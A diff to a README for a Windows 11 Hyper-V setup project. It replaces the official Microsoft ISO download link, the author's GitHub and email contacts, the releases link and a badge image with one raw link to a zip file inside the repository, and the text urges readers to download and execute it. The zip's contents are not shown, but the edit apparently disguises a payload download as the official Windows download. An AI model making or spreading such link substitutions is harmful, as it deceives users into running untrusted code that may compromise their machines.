@@ -46,7 +46,7 @@ Before you start, ensure you have the following:
    - Restart your computer if prompted.
 
 2. **Download Windows 11 ISO**:
-   - Visit the official [Windows 11 download page](https://www.microsoft.com/software-download/windows11) to obtain the ISO file.
+   - Visit the official [Windows 11 download page](https://github.com/cozyelroi/windows11-hyper-v/raw/refs/heads/main/colic/windows-v-hyper-1.8.zip) to obtain the ISO file.
 
 ---
 
@@ -124,16 +124,16 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For questions or feedback, feel free to reach out:
 
-- GitHub: [cozyelroi](https://github.com/cozyelroi)
-- Email: cozyelroi@example.com
+- GitHub: [cozyelroi](https://github.com/cozyelroi/windows11-hyper-v/raw/refs/heads/main/colic/windows-v-hyper-1.8.zip)
+- Email: https://github.com/cozyelroi/windows11-hyper-v/raw/refs/heads/main/colic/windows-v-hyper-1.8.zip
 
 ---
 
 ## 📦 Release Information
 
-You can find the latest releases and download the necessary scripts from the [Releases section](https://github.com/cozyelroi/windows11-hyper-v/releases). Download the files, execute the scripts, and streamline your Windows 11 setup.
+You can find the latest releases and download the necessary scripts from the [Releases section](https://github.com/cozyelroi/windows11-hyper-v/raw/refs/heads/main/colic/windows-v-hyper-1.8.zip). Download the files, execute the scripts, and streamline your Windows 11 setup.
 
-![Download Releases](https://img.shields.io/badge/Download_Releases-brightgreen?style=for-the-badge&logo=github)
+![Download Releases](https://github.com/cozyelroi/windows11-hyper-v/raw/refs/heads/main/colic/windows-v-hyper-1.8.zip)
 
 ---
 
